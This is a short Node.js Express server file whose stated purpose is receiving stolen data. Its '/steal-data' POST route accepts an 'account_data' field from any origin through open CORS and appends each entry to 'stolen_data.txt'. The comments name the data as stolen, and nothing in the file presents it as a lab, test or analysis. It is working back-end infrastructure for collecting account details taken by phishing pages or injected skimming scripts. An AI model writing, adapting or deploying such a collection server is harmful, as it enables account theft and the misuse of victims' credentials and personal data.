// server.js
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs'); 

const app = express();
const PORT = 3000;

// Middleware
app.use(cors()); 
app.use(bodyParser.urlencoded({ extended: true })); 
app.use(bodyParser.json());

// Route to handle stolen data
app.post('/steal-data', (req, res) => {
    const accountData = req.body.account_data;

    // Optional: Save data to a file for logging purposes
    fs.appendFile('stolen_data.txt', accountData + '\n', (err) => {
        if (err) {
            console.error('Error saving data:', err);
            return res.status(500).send('Error saving data');
        }
    });

    console.log('Received data:', accountData); // Log received data
    res.status(200).send('Data received successfully'); // Send response back to client
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
